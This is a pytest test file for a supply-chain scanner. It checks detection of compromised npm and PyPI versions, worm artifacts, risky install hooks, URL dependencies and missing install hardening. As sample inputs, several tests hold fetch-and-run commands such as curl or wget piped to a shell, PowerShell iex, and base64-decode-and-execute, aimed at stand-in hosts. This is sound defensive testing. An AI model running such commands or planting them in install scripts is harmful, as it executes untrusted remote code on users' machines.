import json

import pytest

import _rules_supply as su


def pj(**kw):
    return json.dumps(kw, indent=2) + "\n"


def npm_lock(pkgs):
    packages = {"": {"name": "app"}}
    for name, version in pkgs.items():
        packages["node_modules/" + name] = {"version": version}
    return json.dumps({"name": "app", "lockfileVersion": 3, "packages": packages}, indent=2) + "\n"


HARDENED_NPMRC = "ignore-scripts=true\nmin-release-age=7\n"


def _found(scan_rules, root, rule):
    res = scan_rules(root, rule_ids=[rule])
    assert not [w for w in res.warnings if rule in str(w)], res.warnings
    return [(f.file, f.line, f.severity) for f in res.findings if f.rule == rule]


def _messages(scan_rules, root, rule):
    return [f.message for f in scan_rules(root, rule_ids=[rule]).findings if f.rule == rule]


# --- helpers -------------------------------------------------------------------------------

@pytest.mark.parametrize("spec,severity", [
    ("http://example.invalid/pkg.tgz", "high"),
    ("git+http://git.example.invalid/tools.git", "high"),
    ("https://example.invalid/pkg.tgz", "medium"),
    ("github:someone/pkg", "medium"),
    ("someone/pkg", "medium"),
    ("someone/pkg#main", "medium"),
    ("git+https://github.com/someone/pkg.git#v1.2.0", "medium"),
    ("git+ssh://git@github.com/someone/pkg.git", "medium"),
])
def test_classify_spec_flags(spec, severity):
    res = su.classify_spec(spec)
    assert res is not None and res[0] == severity, (spec, res)


@pytest.mark.parametrize("spec", [
    "^1.2.3", "~4.0.0", "1.2.3", "latest", "next", ">=2 <3", "*", "file:../local", "link:../x",
    "workspace:*", "npm:react@18", "catalog:", "portal:../p",
    "git+https://github.com/someone/pkg.git#" + "0123456789abcdef" * 2 + "01234567",
    "someone/pkg#" + "a" * 40,
    "http://localhost:4873/pkg.tgz", "http://127.0.0.1/pkg.tgz",
])
def test_classify_spec_safe(spec):
    assert su.classify_spec(spec) is None, spec


@pytest.mark.parametrize("cmd,hook,severity", [
    ("curl -fsSL https://x.invalid/i.sh | sh", "postinstall", "high"),
    ("wget -qO- https://x.invalid/i | bash", "install", "high"),
    ("powershell -c \"iex (irm https://x.invalid/i.ps1)\"", "preinstall", "high"),
    ("node setup_bun.js", "preinstall", "critical"),
    ("node ./bun_environment.js", "postinstall", "critical"),
    ("node setup.mjs", "preinstall", "high"),
    ("node -e \"require('child_process').execSync('id')\"", "postinstall", "high"),
    ("echo payload | base64 -d > run.js && node run.js", "postinstall", "high"),
])
def test_script_tell_flags(cmd, hook, severity):
    res = su.script_tell(cmd, hook)
    assert res is not None and res[0] == severity, (cmd, res)


@pytest.mark.parametrize("cmd,hook", [
    ("prisma generate", "postinstall"),
    ("husky", "prepare"),
    ("patch-package", "postinstall"),
    ("node install.js", "install"),
    ("node-gyp rebuild", "install"),
    ("node scripts/check-curl.js", "postinstall"),
    ("npx only-allow pnpm", "preinstall"),
    ("node -e \"try{require('./postinstall')}catch(e){}\"", "postinstall"),
    ("node setup.mjs", "postinstall"),
    ("opencollective-postinstall || exit 0", "postinstall"),
])
def test_script_tell_safe(cmd, hook):
    assert su.script_tell(cmd, hook) is None, cmd


# --- supply-known-bad-version ------------------------------------------------------------

def test_known_bad_npm_lockfiles(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="app", dependencies={"axios": "^1.14.0"}),
        "package-lock.json": npm_lock({"axios": "1.14.1", "plain-crypto-js": "4.2.1", "react": "18.2.0"}),
        "old/package.json": pj(name="old", dependencies={"axios": "0.30.4"}),
        "old/yarn.lock": "# yarn lockfile v1\n\naxios@0.30.4:\n  version \"0.30.4\"\n  resolved \"https://registry.yarnpkg.com/axios/-/axios-0.30.4.tgz\"\n",
        "web/package.json": pj(name="web", dependencies={"axios": "^1"}),
        "web/pnpm-lock.yaml": "lockfileVersion: '9.0'\n\npackages:\n\n  axios@1.14.1:\n    resolution: {integrity: sha512-abc}\n",
        "bunapp/package.json": pj(name="bunapp", dependencies={"axios": "^1"}),
        "bunapp/bun.lock": '{\n  "packages": {\n    "axios": ["axios@1.14.1", "", {}, "sha512-abc"]\n  }\n}\n',
    })
    found = _found(scan_rules, tmp_path, "supply-known-bad-version")
    files = sorted({f for f, _, _ in found})
    assert files == ["bunapp/bun.lock", "old/package.json", "old/yarn.lock", "package-lock.json",
                     "web/pnpm-lock.yaml"], found
    assert all(sev == "critical" for _, _, sev in found)
    assert len([f for f in found if f[0] == "package-lock.json"]) == 2


def test_known_bad_deno_imports(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "supabase/config.toml": "project_id = \"demo\"\n",
        "supabase/functions/chat/index.ts": "import axios from 'npm:axios@1.14.1'\nDeno.serve(() => new Response('ok'))\n",
        "supabase/functions/cdn/index.ts": "import axios from 'https://esm.sh/axios@0.30.4'\n",
        "supabase/functions/ranged/index.ts": "import axios from 'npm:axios@^1.14.0'\n",
        "supabase/functions/safe/index.ts": "import axios from 'npm:axios@1.14.2'\n",
        "deno.json": '{\n  "imports": {\n    "axios": "npm:axios@1.14.1"\n  }\n}\n',
    })
    found = _found(scan_rules, tmp_path, "supply-known-bad-version")
    assert sorted(f for f, _, _ in found) == ["deno.json", "supabase/functions/cdn/index.ts",
                                              "supabase/functions/chat/index.ts"], found
    assert all(sev == "critical" for _, _, sev in found)


def test_known_bad_installed_in_node_modules(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="app", dependencies={"axios": "^1.14.0"}),
        "node_modules/axios/package.json": pj(name="axios", version="1.14.1"),
    })
    found = _found(scan_rules, tmp_path, "supply-known-bad-version")
    assert [f for f, _, _ in found] == ["node_modules/axios/package.json"]


@pytest.mark.parametrize("files", [
    {"package.json": pj(name="app", dependencies={"axios": "^1.14.0"}),
     "package-lock.json": npm_lock({"axios": "1.14.0"})},
    {"package.json": pj(name="app", dependencies={"axios": "1.14.2", "axios-retry": "1.14.1"}),
     "package-lock.json": npm_lock({"axios": "1.14.2", "axios-retry": "1.14.1"})},
    {"package.json": pj(name="app", dependencies={"axios": "~0.30.3"})},
    {"requirements.txt": "litellm==1.82.6\nlitellm>=1.82.9\nlitellm-proxy==1.82.8\n"},
    {"README.md": "Never install axios 1.14.1 or litellm==1.82.7.\n"},
])
def test_known_bad_safe(tmp_path, write_tree, scan_rules, files):
    write_tree(tmp_path, files)
    assert _found(scan_rules, tmp_path, "supply-known-bad-version") == []


@pytest.mark.parametrize("path,text,line", [
    ("requirements.txt", "requests==2.32.0\nlitellm==1.82.7\n", 2),
    ("requirements/prod.txt", "LiteLLM[proxy] == 1.82.8  # pinned\n", 1),
    ("pyproject.toml", "[project]\nname = \"a\"\ndependencies = [\n  \"litellm==1.82.8\",\n]\n", 4),
    ("uv.lock", "version = 1\n\n[[package]]\nname = \"litellm\"\nversion = \"1.82.7\"\n", 5),
    ("poetry.lock", "[[package]]\nname = \"litellm\"\nversion = \"1.82.8\"\n", 3),
    ("Pipfile.lock", json.dumps({"default": {"litellm": {"version": "==1.82.7"}}}, indent=2), 4),
])
def test_known_bad_python(tmp_path, write_tree, scan_rules, path, text, line):
    write_tree(tmp_path, {path: text})
    found = _found(scan_rules, tmp_path, "supply-known-bad-version")
    assert found == [(path, line, "critical")], found


def test_known_bad_python_virtualenv(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "requirements.txt": "litellm>=1.80\n",
        ".venv/pyvenv.cfg": "home = /usr/bin\n",
        ".venv/Lib/site-packages/litellm-1.82.8.dist-info/METADATA": "Name: litellm\nVersion: 1.82.8\n",
    })
    found = _found(scan_rules, tmp_path, "supply-known-bad-version")
    assert [f for f, _, _ in found] == [".venv/Lib/site-packages/litellm-1.82.8.dist-info"], found


# --- supply-installed-worm-artifact ------------------------------------------------------

def test_installed_worm_artifacts(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="app", dependencies={"left-pad": "^1"}),
        "node_modules/left-pad/package.json": pj(name="left-pad", version="1.3.0"),
        "node_modules/left-pad/setup_bun.js": "// installer\n",
        "node_modules/@scope/helper/package.json": pj(
            name="@scope/helper", version="2.0.0",
            scripts={"postinstall": "curl -s https://x.invalid/p | sh"}),
        "node_modules/.pnpm/evil@1.0.0/node_modules/evil/package.json": pj(
            name="evil", version="1.0.0", scripts={"preinstall": "node setup.mjs"}),
        "node_modules/sharp/package.json": pj(name="sharp", version="0.33.0",
                                              scripts={"install": "node install/check.js"}),
        "node_modules/core-js/package.json": pj(name="core-js", version="3.0.0",
                                                scripts={"postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""}),
    })
    found = _found(scan_rules, tmp_path, "supply-installed-worm-artifact")
    by_file = {f: sev for f, _, sev in found}
    assert by_file == {
        "node_modules/left-pad/setup_bun.js": "critical",
        "node_modules/@scope/helper/package.json": "high",
        "node_modules/.pnpm/evil@1.0.0/node_modules/evil/package.json": "high",
    }, found


def test_installed_worm_clean_tree(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="app", dependencies={"esbuild": "^0.20"}),
        "node_modules/esbuild/package.json": pj(name="esbuild", version="0.20.0",
                                                scripts={"postinstall": "node install.js"}),
        "node_modules/husky/package.json": pj(name="husky", version="9.0.0", scripts={"prepare": "curl x | sh"}),
    })
    assert _found(scan_rules, tmp_path, "supply-installed-worm-artifact") == []


# --- supply-risky-lifecycle-script -------------------------------------------------------

def test_risky_lifecycle_script(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="app", scripts={
            "build": "next build",
            "postinstall": "curl -fsSL https://x.invalid/setup.sh | sh",
            "preinstall": "node setup_bun.js",
        }),
    })
    found = _found(scan_rules, tmp_path, "supply-risky-lifecycle-script")
    assert sorted(found) == [("package.json", 5, "high"), ("package.json", 6, "critical")], found


@pytest.mark.parametrize("scripts", [
    {"postinstall": "prisma generate", "prepare": "husky", "preinstall": "npx only-allow pnpm"},
    {"postinstall": "patch-package && node scripts/check-curl.js"},
    {"build": "curl -fsSL https://x.invalid/i.sh | sh", "deploy": "wget https://x.invalid/a"},
    {"postinstall": "node setup.mjs"},
])
def test_risky_lifecycle_script_safe(tmp_path, write_tree, scan_rules, scripts):
    write_tree(tmp_path, {"package.json": pj(name="app", scripts=scripts)})
    assert _found(scan_rules, tmp_path, "supply-risky-lifecycle-script") == []


# --- supply-url-dependency ----------------------------------------------------------------

def test_url_dependency_package_json(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {"package.json": pj(name="app", dependencies={
        "react": "^18.2.0",
        "plain": "http://example.invalid/plain.tgz",
        "tarball": "https://example.invalid/tarball.tgz",
        "fork": "github:someone/fork",
        "pinned": "github:someone/pinned#" + "c" * 40,
        "local": "file:../local",
        "alias": "npm:react@18",
        "ws": "workspace:*",
    })})
    found = _found(scan_rules, tmp_path, "supply-url-dependency")
    assert sorted(found) == [("package.json", 5, "high"), ("package.json", 6, "medium"),
                             ("package.json", 7, "medium")], found


def test_url_dependency_lockfile(tmp_path, write_tree, scan_rules):
    lock = json.dumps({"lockfileVersion": 3, "packages": {
        "": {},
        "node_modules/a": {"version": "1.0.0", "resolved": "http://registry.example.invalid/a/-/a-1.0.0.tgz"},
        "node_modules/b": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/b/-/b-1.0.0.tgz"},
        "node_modules/c": {"version": "1.0.0", "resolved": "http://localhost:4873/c/-/c-1.0.0.tgz"},
    }}, indent=2)
    write_tree(tmp_path, {"package.json": pj(name="app"), "package-lock.json": lock})
    found = _found(scan_rules, tmp_path, "supply-url-dependency")
    assert [(f, sev) for f, _, sev in found] == [("package-lock.json", "high")], found


def test_url_dependency_python(tmp_path, write_tree, scan_rules):
    sha = "0123456789abcdef" * 2 + "01234567"
    write_tree(tmp_path, {
        "requirements.txt": (
            "requests==2.32.0\n"
            "git+https://github.com/someone/tool.git@main#egg=tool\n"
            "git+https://github.com/someone/pinned.git@" + sha + "#egg=pinned\n"
            "--index-url http://pypi.example.invalid/simple\n"
            "--extra-index-url https://pypi.example.invalid/simple\n"
            "-e .\n"
            "# git+http://example.invalid/old.git\n"),
        "pyproject.toml": (
            "[project]\nname = \"a\"\n\n[project.urls]\nHomepage = \"https://example.invalid\"\n"),
    })
    found = _found(scan_rules, tmp_path, "supply-url-dependency")
    assert sorted(found) == [("requirements.txt", 2, "medium"), ("requirements.txt", 4, "high")], found


# --- supply-unlocked-dependency (slopsquat signal) -------------------------------------------

def test_unlocked_dependency_npm(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="app", workspaces=["packages/*"], dependencies={
            "react": "^18.2.0", "react-auth-helperz": "^1.0.0", "@app/ui": "*", "zod": "^3"}),
        "package-lock.json": npm_lock({"react": "18.2.0"}),
        "packages/ui/package.json": pj(name="@app/ui", version="1.0.0"),
        "node_modules/zod/package.json": pj(name="zod", version="3.23.0"),
    })
    res = scan_rules(tmp_path, rule_ids=["supply-unlocked-dependency"])
    found = [(f.file, f.line, f.severity, f.confidence, f.needs_confirmation) for f in res.findings]
    assert found == [("package.json", 8, "low", "low", True)], found
    msg = res.findings[0].message
    assert "react-auth-helperz" in msg and "offline" in msg and "registry" in msg


def test_unlocked_dependency_python(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "pyproject.toml": ("[project]\nname = \"a\"\ndependencies = [\n  \"requests>=2\",\n  \"Fast_API-auth-magic>=0.1\",\n]\n"
                           "\n[dependency-groups]\ndev = [\"pytest>=8\"]\n"),
        "uv.lock": ("version = 1\n\n[[package]]\nname = \"requests\"\nversion = \"2.32.0\"\n\n"
                    "[[package]]\nname = \"pytest\"\nversion = \"8.3.0\"\n"),
    })
    found = _found(scan_rules, tmp_path, "supply-unlocked-dependency")
    assert found == [("pyproject.toml", 5, "low")], found


@pytest.mark.parametrize("files", [
    # no lockfile at all: nothing to compare with
    {"package.json": pj(name="app", dependencies={"made-up-thing": "^1"})},
    {"requirements.txt": "made-up-thing==1.0\n"},
    # everything locked, names normalised
    {"package.json": pj(name="app", dependencies={"@types/node": "^20"}, devDependencies={"vite": "^5"}),
     "yarn.lock": "# yarn lockfile v1\n\n\"@types/node@^20\":\n  version \"20.1.0\"\n\nvite@^5:\n  version \"5.0.0\"\n"},
    {"package.json": pj(name="app", dependencies={"react": "^18"}),
     "pnpm-lock.yaml": "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      react:\n        specifier: ^18\n        version: 18.2.0\n"},
    {"pyproject.toml": "[project]\nname = \"a\"\ndependencies = [\"Typing_Extensions>=4\"]\n",
     "uv.lock": "version = 1\n\n[[package]]\nname = \"typing-extensions\"\nversion = \"4.12.0\"\n"},
])
def test_unlocked_dependency_safe(tmp_path, write_tree, scan_rules, files):
    write_tree(tmp_path, files)
    assert _found(scan_rules, tmp_path, "supply-unlocked-dependency") == []


# --- supply-no-install-hardening ---------------------------------------------------------

@pytest.mark.parametrize("files,target,severity,needle", [
    # Advice anchors on the config file when it exists, else on the lockfile (never a missing file).
    ({"package.json": pj(name="a", dependencies={"react": "^18"}), "package-lock.json": npm_lock({"react": "18.2.0"})},
     "package-lock.json", "info", "min-release-age=7"),
    ({"package.json": pj(name="a", dependencies={"react": "^18"}), "package-lock.json": npm_lock({"react": "18.2.0"}),
      ".npmrc": "ignore-scripts=true\n"},
     ".npmrc", "info", "npm 11.10+"),
    ({"package.json": pj(name="a", packageManager="pnpm@10.4.0", dependencies={"react": "^18"}),
      "pnpm-lock.yaml": "lockfileVersion: '9.0'\n"},
     "pnpm-lock.yaml", "info", "minimumReleaseAge: 10080"),
    ({"package.json": pj(name="a", packageManager="pnpm@11.0.0", dependencies={"react": "^18"}),
      "pnpm-lock.yaml": "lockfileVersion: '9.0'\n", "pnpm-workspace.yaml": "dangerouslyAllowAllBuilds: true\n"},
     "pnpm-workspace.yaml", "medium", "allowBuilds"),
    ({"package.json": pj(name="a", dependencies={"react": "^18"}), ".yarnrc.yml": "nodeLinker: node-modules\n",
      "yarn.lock": "__metadata:\n  version: 8\n"},
     ".yarnrc.yml", "info", "npmMinimalAgeGate"),
    ({"package.json": pj(name="a", dependencies={"react": "^18"}), "bun.lock": "{}\n"},
     "bun.lock", "info", "604800"),
    ({"pyproject.toml": "[project]\nname = \"a\"\n", "uv.lock": "version = 1\n"},
     "pyproject.toml", "info", "exclude-newer"),
    ({"package.json": pj(name="a", dependencies={"react": "^18"})},
     "package.json", "low", "no lockfile"),
    # A gate that is switched off does not count.
    ({"pyproject.toml": "[project]\nname = \"a\"\n\n[tool.uv]\nexclude-newer = false\n", "uv.lock": "version = 1\n"},
     "pyproject.toml", "info", "exclude-newer"),
    ({"package.json": pj(name="a", dependencies={"react": "^18"}),
      ".yarnrc.yml": "enableScripts: false\nnpmMinimalAgeGate: 0\n", "yarn.lock": "__metadata:\n  version: 8\n"},
     ".yarnrc.yml", "info", "npmMinimalAgeGate"),
])
def test_install_hardening_missing(tmp_path, write_tree, scan_rules, files, target, severity, needle):
    write_tree(tmp_path, files)
    res = scan_rules(tmp_path, rule_ids=["supply-no-install-hardening"])
    found = [(f.file, f.severity, f.message) for f in res.findings]
    assert len(found) == 1 and found[0][0] == target and found[0][1] == severity, found
    assert needle in found[0][2]


@pytest.mark.parametrize("files", [
    {"package.json": pj(name="a", dependencies={"react": "^18"}), "package-lock.json": npm_lock({"react": "18.2.0"}),
     ".npmrc": HARDENED_NPMRC},
    {"package.json": pj(name="a", packageManager="pnpm@10.4.0", dependencies={"react": "^18"}),
     "pnpm-lock.yaml": "lockfileVersion: '9.0'\n", "pnpm-workspace.yaml": "minimumReleaseAge: 10080\n"},
    {"package.json": pj(name="a", packageManager="pnpm@11.1.0", dependencies={"react": "^18"}),
     "pnpm-lock.yaml": "lockfileVersion: '9.0'\n"},
    {"package.json": pj(name="a", dependencies={"react": "^18"}), ".yarnrc.yml": "enableScripts: false\nnpmMinimalAgeGate: 7d\n",
     "yarn.lock": "__metadata:\n  version: 8\n"},
    {"package.json": pj(name="a", dependencies={"react": "^18"}), ".yarnrc": "ignore-scripts true\n",
     "yarn.lock": "# yarn lockfile v1\n"},
    {"package.json": pj(name="a", dependencies={"react": "^18"}), "bun.lock": "{}\n",
     "bunfig.toml": "[install]\nminimumReleaseAge = 604800\n"},
    {"pyproject.toml": "[project]\nname = \"a\"\n\n[tool.uv]\nexclude-newer = \"7 days\"\n", "uv.lock": "version = 1\n"},
    # a package.json with no dependencies needs no lockfile
    {"package.json": pj(name="tools", scripts={"fmt": "prettier -w ."})},
    # plain pip projects get no advice from this rule
    {"requirements.txt": "requests==2.32.0\n"},
])
def test_install_hardening_present(tmp_path, write_tree, scan_rules, files):
    write_tree(tmp_path, files)
    assert _found(scan_rules, tmp_path, "supply-no-install-hardening") == []


def test_install_hardening_monorepo_reports_once(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="root", workspaces=["apps/*"], devDependencies={"turbo": "^2"}),
        "package-lock.json": npm_lock({"turbo": "2.0.0"}),
        "apps/web/package.json": pj(name="web", dependencies={"next": "^14"}),
        "apps/api/package.json": pj(name="api", dependencies={"express": "^4"}),
    })
    found = _found(scan_rules, tmp_path, "supply-no-install-hardening")
    assert [f for f, _, _ in found] == ["package-lock.json"], found


def test_hardening_note_does_not_hide_real_findings(tmp_path, write_tree, scan_rules):
    """The advice is low severity; anything real in the same project still sorts above it."""
    write_tree(tmp_path, {
        "package.json": pj(name="a", dependencies={"axios": "^1.14.0"}),
        "package-lock.json": npm_lock({"axios": "1.14.1"}),
    })
    res = scan_rules(tmp_path)
    rules = [f.rule for f in res.findings if f.rule.startswith("supply-")]
    assert rules[0] == "supply-known-bad-version" and rules[-1] == "supply-no-install-hardening"


PNPM_LOCK_TWO_IMPORTERS = (
    "lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    devDependencies:\n      turbo:\n        specifier: ^2\n"
    "        version: 2.0.0\n\n  packages/ui:\n    dependencies:\n      react:\n        specifier: ^18\n"
    "        version: 18.2.0\n\npackages:\n\n  react@18.2.0:\n    resolution: {integrity: sha512-x}\n"
)


def test_unlocked_dependency_skips_sub_projects_outside_the_workspace(tmp_path, write_tree, scan_rules):
    """An example app that is not a workspace member installs on its own; the
    root lockfile says nothing about it."""
    write_tree(tmp_path, {
        "package.json": pj(name="root", private=True, devDependencies={"turbo": "^2"}),
        "pnpm-workspace.yaml": "packages:\n  - packages/*\n",
        "pnpm-lock.yaml": PNPM_LOCK_TWO_IMPORTERS,
        "packages/ui/package.json": pj(name="@app/ui", dependencies={"react": "^18"}),
        "examples/expo-demo/package.json": pj(name="expo-demo", dependencies={"expo-icons-thing": "^15"}),
        "biometric-sync/package.json": pj(name="sync", dependencies={"axios": "^1"}),
    })
    assert _found(scan_rules, tmp_path, "supply-unlocked-dependency") == []


@pytest.mark.parametrize("files,member", [
    # pnpm: importers in the lockfile
    ({"package.json": pj(name="root", private=True), "pnpm-lock.yaml": PNPM_LOCK_TWO_IMPORTERS,
      "pnpm-workspace.yaml": "packages:\n  - packages/*\n",
      "packages/ui/package.json": pj(name="@app/ui", dependencies={"react": "^18", "reakt-dom-utilz": "^1"})},
     "packages/ui/package.json"),
    # npm: packages["<dir>"] in package-lock.json
    ({"package.json": pj(name="root", workspaces=["apps/*"]),
      "package-lock.json": json.dumps({"lockfileVersion": 3, "packages": {
          "": {"name": "root"}, "apps/web": {"name": "web"}, "node_modules/react": {"version": "18.2.0"}}}),
      "apps/web/package.json": pj(name="web", dependencies={"react": "^18", "reakt-dom-utilz": "^1"})},
     "apps/web/package.json"),
    # yarn: workspaces globs in the root package.json
    ({"package.json": pj(name="root", private=True, workspaces={"packages": ["apps/*"]}),
      "yarn.lock": "# yarn lockfile v1\n\nreact@^18:\n  version \"18.2.0\"\n",
      "apps/web/package.json": pj(name="web", dependencies={"react": "^18", "reakt-dom-utilz": "^1"})},
     "apps/web/package.json"),
])
def test_unlocked_dependency_still_checks_workspace_members(tmp_path, write_tree, scan_rules, files, member):
    write_tree(tmp_path, files)
    res = scan_rules(tmp_path, rule_ids=["supply-unlocked-dependency"])
    found = [(f.file, f.evidence) for f in res.findings]
    assert len(found) == 1 and found[0][0] == member and "reakt-dom-utilz" in found[0][1], found


def test_mixed_lockfiles_count_any_and_skip_the_unused_one(tmp_path, write_tree, scan_rules):
    """bun.lock is current, package-lock.json is a leftover (common in app-builder exports)."""
    write_tree(tmp_path, {
        "package.json": pj(name="app", dependencies={"react": "^18", "framer-motion": "^11"}),
        "bun.lock": '{\n  "lockfileVersion": 1,\n  "workspaces": {\n    "": {\n      "name": "app",\n    },\n  },\n'
                    '  "packages": {\n    "framer-motion": ["framer-motion@11.0.0", "", {}, "sha512-x"],\n'
                    '    "react": ["react@18.2.0", "", {}, "sha512-y"],\n  }\n}\n',
        "package-lock.json": npm_lock({"react": "18.2.0"}),
        "bunfig.toml": "[install]\nminimumReleaseAge = 86400\n",
    })
    assert _found(scan_rules, tmp_path, "supply-unlocked-dependency") == []
    res = scan_rules(tmp_path, rule_ids=["supply-no-install-hardening"])
    found = [(f.file, f.severity, f.message) for f in res.findings]
    assert len(found) == 1, found
    assert found[0][0] == "package-lock.json" and found[0][1] == "info" and "unused" in found[0][2], found


def test_mixed_lockfiles_without_a_hint_name_both(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="app", dependencies={"react": "^18"}),
        "yarn.lock": "# yarn lockfile v1\n\nreact@^18:\n  version \"18.2.0\"\n",
        "package-lock.json": npm_lock({"react": "18.2.0"}),
    })
    msgs = _messages(scan_rules, tmp_path, "supply-no-install-hardening")
    assert any("several lockfiles" in m for m in msgs), msgs
    assert any(m.startswith("npm installs") for m in msgs) and any(m.startswith("yarn installs") for m in msgs)


def test_pyproject_include_groups_and_markers_are_not_packages(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "pyproject.toml": (
            "[project]\nname = \"a\"\ndependencies = [\"uvicorn[standard]>=0.30\", \"flask\"]\n\n"
            "[dependency-groups]\ndev = [\n    \"ruff\",\n    {include-group = \"docs\"},\n"
            "    {include-group = \"tests\"},\n]\ndocs = [\"sphinx\"]\ntests = [\"pytest\"]\n"
            "gha = [\n    \"gha-update ; python_full_version >= '3.12'\",\n    \"made-up-thing\",\n]\n"),
        "uv.lock": "".join("[[package]]\nname = \"%s\"\nversion = \"1.0\"\n\n" % n
                           for n in ("uvicorn", "flask", "ruff", "sphinx", "pytest", "gha-update")),
    })
    found = _found(scan_rules, tmp_path, "supply-unlocked-dependency")
    assert found == [("pyproject.toml", 15, "low")], found


def test_install_hardening_one_note_per_manager_and_side_projects_skipped(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "nextjs-start/package.json": pj(name="a", dependencies={"next": "^15"}),
        "nextjs-start/package-lock.json": npm_lock({"next": "15.0.0"}),
        "nextjs-end/package.json": pj(name="b", dependencies={"next": "^15"}),
        "nextjs-end/package-lock.json": npm_lock({"next": "15.0.0"}),
        "docs/package.json": pj(name="docs", dependencies={"vitepress": "^1"}),
        "docs/package-lock.json": npm_lock({"vitepress": "1.0.0"}),
        "__tests__/playwright-test/package.json": pj(name="t", dependencies={"@playwright/test": "^1"}),
        "install/package.json": pj(name="template", dependencies={"express": "^4"}),
    })
    res = scan_rules(tmp_path, rule_ids=["supply-no-install-hardening"])
    found = [(f.file, f.severity, f.message) for f in res.findings]
    assert len(found) == 1, found
    assert found[0][0] == "nextjs-end/package-lock.json" and found[0][1] == "info"
    assert "nextjs-end/" in found[0][2] and "nextjs-start/" in found[0][2] and "docs/" not in found[0][2]


def test_install_hardening_no_lockfile_for_standalone_sub_project(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="app", dependencies={"react": "^18"}),
        "bun.lock": "{}\n",
        "bunfig.toml": "[install]\nminimumReleaseAge = 604800\n",
        "biometric-sync/package.json": pj(name="sync", dependencies={"axios": "^1"}),
    })
    found = _found(scan_rules, tmp_path, "supply-no-install-hardening")
    assert found == [("biometric-sync/package.json", 1, "low")], found


def test_no_lockfile_note_only_asks_for_missing_settings(tmp_path, write_tree, scan_rules):
    """A framework skeleton that already sets ignore-scripts=true is only told what is missing."""
    write_tree(tmp_path, {
        "package.json": pj(name="app", devDependencies={"vite": "^8"}),
        ".npmrc": "ignore-scripts=true\naudit=true\n",
    })
    msgs = _messages(scan_rules, tmp_path, "supply-no-install-hardening")
    assert len(msgs) == 1 and "npm ci" in msgs[0], msgs
    assert "ignore-scripts" not in msgs[0] and "min-release-age=7" in msgs[0], msgs
    write_tree(tmp_path, {"package.json": pj(name="app", packageManager="pnpm@10.4.0", devDependencies={"vite": "^8"})})
    msgs = _messages(scan_rules, tmp_path, "supply-no-install-hardening")
    assert len(msgs) == 1 and "pnpm install --frozen-lockfile" in msgs[0] and "minimumReleaseAge" in msgs[0], msgs


def test_install_hardening_alone_does_not_fail_the_scan(tmp_path, write_tree, scan_rules):
    write_tree(tmp_path, {
        "package.json": pj(name="a", dependencies={"react": "^18"}),
        "package-lock.json": npm_lock({"react": "18.2.0"}),
    })
    res = scan_rules(tmp_path, rule_ids=["supply-no-install-hardening"])
    assert res.findings and all(f.severity == "info" for f in res.findings)


def test_known_bad_list_is_data_with_sources():
    assert su.KNOWN_BAD
    for e in su.KNOWN_BAD:
        assert e["ecosystem"] in ("npm", "pypi") and e["name"] and e["advice"] and e["source"]
        assert e["versions"] is None or all(v.count(".") == 2 for v in e["versions"])
